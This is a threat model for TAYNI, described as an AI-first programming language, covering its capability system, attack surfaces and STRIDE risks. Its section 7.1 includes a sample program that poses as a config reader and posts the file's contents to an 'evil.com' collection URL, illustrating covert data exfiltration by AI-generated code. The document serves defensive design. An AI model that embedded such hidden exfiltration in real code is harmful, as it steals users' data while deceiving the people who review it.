# TAYNI Threat Model

**Version:** 1.0  
**Date:** 2026-06-19  
**Status:** Initial Draft

## 1. Overview

This document describes the security threat model for TAYNI, an AI-first programming language. It identifies assets, threat actors, attack surfaces, and mitigations.

## 2. System Description

### 2.1 Components

```
┌─────────────────────────────────────────────────────────────┐
│                    TAYNI Ecosystem                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐  │
│  │ Source Code  │───▶│   Compiler   │───▶│   Binary     │  │
│  │   (.tayni)   │    │  (tayni-c)   │    │ (PE/ELF/Wasm)│  │
│  └──────────────┘    └──────────────┘    └──────────────┘  │
│         │                   │                   │          │
│         ▼                   ▼                   ▼          │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐  │
│  │     LSP      │    │   VS Code    │    │   Runtime    │  │
│  │   Server     │    │  Extension   │    │ Environment  │  │
│  └──────────────┘    └──────────────┘    └──────────────┘  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 2.2 Data Flow

1. **Development**: Developer writes `.tayni` source code
2. **Compilation**: Compiler parses and generates binary
3. **Execution**: Binary runs on target platform
4. **AI Generation**: AI systems generate TAYNI code

## 3. Assets

| Asset | Description | Sensitivity |
|-------|-------------|-------------|
| Source Code | TAYNI programs | Medium-High |
| Compiler | tayni-c binary | High |
| Generated Binaries | PE/ELF/Wasm output | High |
| LSP Server | Language server | Medium |
| User Data | Data processed by TAYNI programs | Variable |
| Credentials | API keys, tokens in programs | Critical |

## 4. Threat Actors

| Actor | Motivation | Capability |
|-------|------------|------------|
| **Malicious AI** | Generate harmful code | High |
| **Supply Chain Attacker** | Compromise compiler/stdlib | High |
| **External Attacker** | Exploit running TAYNI apps | Medium-High |
| **Insider** | Data theft, sabotage | Medium |
| **Script Kiddie** | Opportunistic attacks | Low |

## 5. Attack Surfaces

### 5.1 Compiler (tayni-c)

| Attack Vector | Risk | Mitigation |
|---------------|------|------------|
| Malformed input | Buffer overflow | Input validation, fuzzing |
| Path traversal | File access | Sanitize paths |
| Dependency confusion | Supply chain | Minimal dependencies |
| Code injection | Arbitrary execution | No eval, strict parsing |

### 5.2 Generated Binaries

| Attack Vector | Risk | Mitigation |
|---------------|------|------------|
| Memory corruption | Code execution | Capability restrictions |
| Network exposure | Data exfiltration | cap:net required |
| File system access | Data theft | cap:fs required |
| Environment leakage | Credential theft | cap:env required |

### 5.3 AI-Generated Code

| Attack Vector | Risk | Mitigation |
|---------------|------|------------|
| Prompt injection | Malicious code | Code review, sandboxing |
| Capability escalation | Unauthorized access | Compile-time enforcement |
| Logic bombs | Delayed attacks | Static analysis |
| Data exfiltration | Privacy breach | Network capability audit |

### 5.4 LSP Server

| Attack Vector | Risk | Mitigation |
|---------------|------|------------|
| Malicious workspace | Code execution | Sandbox LSP |
| Path traversal | File access | Validate paths |
| DoS | Resource exhaustion | Rate limiting |

## 6. Capability-Based Security Model

TAYNI's primary security mechanism is the capability system:

### 6.1 Capabilities

| Capability | Grants | Risk if Abused |
|------------|--------|----------------|
| `cap:net` | TCP/HTTP networking | Data exfiltration, C2 |
| `cap:fs` | File system access | Data theft, malware |
| `cap:env` | Environment variables | Credential theft |
| `cap:proc` | Process management | Privilege escalation |
| `cap:time` | Time operations | Timing attacks |

### 6.2 Security Properties

1. **Explicit Declaration**: Capabilities must be declared at file start
2. **Compile-Time Enforcement**: Missing capabilities cause compilation errors
3. **No Runtime Bypass**: Cannot acquire capabilities at runtime
4. **Minimal by Default**: No capabilities = pure computation only

### 6.3 Limitations

- No memory safety guarantees (unlike Rust)
- No sandboxing beyond capability system
- Capabilities are coarse-grained (all-or-nothing)
- No capability revocation

## 7. Threat Scenarios

### 7.1 Malicious AI-Generated Code

**Scenario**: AI generates code that appears benign but exfiltrates data.

```tayni
cap:net
cap:fs

fn main() {
    // Appears to be a config reader
    let config = File.read("config.json")
    
    // Actually exfiltrates to attacker
    HTTP.post("https://evil.com/collect", config)
}
```

**Mitigations**:
- Review all capability declarations
- Audit network destinations
- Use allowlists for external connections
- Static analysis for suspicious patterns

### 7.2 Supply Chain Attack

**Scenario**: Compromised compiler inserts backdoor into all binaries.

**Mitigations**:
- Reproducible builds
- Compiler checksum verification
- Multiple independent compiler implementations
- Code signing

### 7.3 Capability Confusion

**Scenario**: Developer grants more capabilities than needed.

```tayni
cap:net
cap:fs
cap:env
cap:proc  // Why does a calculator need this?

fn main() {
    let result = 2 + 2
    PRT(result)
}
```

**Mitigations**:
- Capability linting (warn on unused)
- Principle of least privilege documentation
- IDE warnings for excessive capabilities

## 8. Security Controls

### 8.1 Implemented

| Control | Status | Description |
|---------|--------|-------------|
| Capability system | ✅ | Compile-time permission enforcement |
| No eval | ✅ | Cannot execute arbitrary code at runtime |
| Zero dependencies | ✅ | No supply chain for runtime |
| Static typing | ✅ | Type errors caught at compile time |

### 8.2 Planned

| Control | Priority | Description |
|---------|----------|-------------|
| Capability linting | High | Warn on unused/excessive capabilities |
| Static analysis | High | Detect suspicious patterns |
| Sandboxed execution | Medium | Runtime isolation |
| Code signing | Medium | Verify binary integrity |
| Formal verification | Low | Prove security properties |

## 9. STRIDE Analysis

| Threat | Applies To | Risk | Mitigation |
|--------|------------|------|------------|
| **S**poofing | Network comms | Medium | TLS (planned) |
| **T**ampering | Binaries, data | Medium | Code signing (planned) |
| **R**epudiation | Actions | Low | Logging |
| **I**nformation Disclosure | Files, network | High | Capabilities |
| **D**enial of Service | Compiler, runtime | Medium | Resource limits |
| **E**levation of Privilege | Capabilities | High | Compile-time enforcement |

## 10. Risk Matrix

| Threat | Likelihood | Impact | Risk Level |
|--------|------------|--------|------------|
| Malicious AI code | High | High | **Critical** |
| Compiler vulnerability | Low | Critical | **High** |
| Capability bypass | Very Low | Critical | **Medium** |
| LSP exploitation | Low | Medium | **Low** |
| DoS on compiler | Medium | Low | **Low** |

## 11. Recommendations

### Immediate (Phase 1)
1. ✅ Document capability system
2. ✅ Create SECURITY.md
3. Add capability linting to compiler
4. Implement static analysis for common vulnerabilities

### Short-term (Phase 2)
1. Add TLS support for secure communications
2. Implement code signing for binaries
3. Create security-focused examples
4. External security audit

### Long-term (Phase 3)
1. Formal verification of capability system
2. Sandboxed execution environment
3. Fine-grained capabilities
4. Capability revocation

## 12. Incident Response

### 12.1 Vulnerability Disclosure

See [SECURITY.md](../SECURITY.md) for reporting process.

### 12.2 Response Timeline

| Severity | Response | Fix | Disclosure |
|----------|----------|-----|------------|
| Critical | 24h | 48h | After fix |
| High | 48h | 7d | After fix |
| Medium | 7d | 30d | After fix |
| Low | 30d | Next release | With release |

## 13. References

- [OWASP Threat Modeling](https://owasp.org/www-community/Threat_Modeling)
- [STRIDE Model](https://docs.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats)
- [Capability-Based Security](https://en.wikipedia.org/wiki/Capability-based_security)

---

**Document Owner**: NELAIA Security Team  
**Next Review**: 2026-09-19
